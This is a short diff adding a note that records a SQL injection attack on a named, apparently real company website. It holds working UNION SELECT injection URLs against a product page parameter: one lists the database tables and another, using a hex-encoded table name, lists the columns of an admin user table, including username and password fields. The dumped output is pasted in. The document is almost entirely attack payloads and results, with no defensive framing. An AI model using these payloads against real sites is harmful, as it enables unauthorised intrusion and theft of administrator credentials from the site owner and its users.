@@ -1,0 +1,44 @@
+
+
+{table_name}
+url : http://www.aminter.co.th/product2.php?id=-1+union+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+-
+
+ck_agent,
+ck_banner,
+ck_brand,
+ck_catalogue,
+ck_contact,
+ck_figure,
+ck_group,
+ck_member,
+ck_menu,
+ck_menufront,
+ck_news,
+ck_picnews,
+ck_product,
+ck_productbrand,
+ck_productpicture,
+ck_productsub,
+ck_producttype,
+ck_subfigure,
+ck_subgroup,
+ck_user_admin,
+ck_welcome
+
+{table_name >> ck_user_admin}
+url : http://www.aminter.co.th/product2.php?id=-1+union+select+1,group_concat(column_name),3,4,5+from%20information_schema.columns%20where%20table_name=0x636b5f757365725f61646d696e--
+
+admin_id,
+admin_username,
+admin_pass,
+admin_name,
+admin_surname,
+admin_email,
+admin_tel,
+admin_active,
+admin_ip_login,
+admin_admin_create,
+admin_admin_update,
+admin_date_create,
+admin_date_update,
+admin_date_login
